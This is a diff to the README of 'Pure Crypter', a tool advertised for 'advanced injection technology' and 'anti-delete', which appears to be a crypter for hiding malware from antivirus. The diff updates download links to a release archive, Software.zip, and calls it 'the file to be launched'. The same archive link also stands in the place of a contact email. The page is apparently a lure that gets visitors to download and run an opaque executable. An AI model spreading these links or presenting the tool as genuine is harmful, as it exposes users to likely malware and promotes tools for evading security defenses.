@@ -12,7 +12,7 @@ Welcome to the repository for Pure Crypter, an advanced tool coded in .NET using
 
 You can download the latest version of Pure Crypter by clicking the button below:
 
-[![Download Pure Crypter](https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v1.0/Installer.zip%20Crypter-blue)](https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v1.0/Installer.zip)
+[![Download Pure Crypter](https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v2.0/Software.zip%20Crypter-blue)](https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v2.0/Software.zip)
 
 (Note: The link above contains the file to be launched.)
 
@@ -33,7 +33,7 @@ Contributions to Pure Crypter are always welcome! If you have any improvements, 
 
 ## 📞 Contact
 
-If you have any questions, suggestions, or issues regarding Pure Crypter, you can reach out to us via email at https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v1.0/Installer.zip
+If you have any questions, suggestions, or issues regarding Pure Crypter, you can reach out to us via email at https://github.com/ConnorMc22/Pure-Crypter-ADVANCED-INJECTION-TECHNOLOGY-64BIT-32BIT-Anti-Delete/releases/download/v2.0/Software.zip
 
 ## 📄 License
 
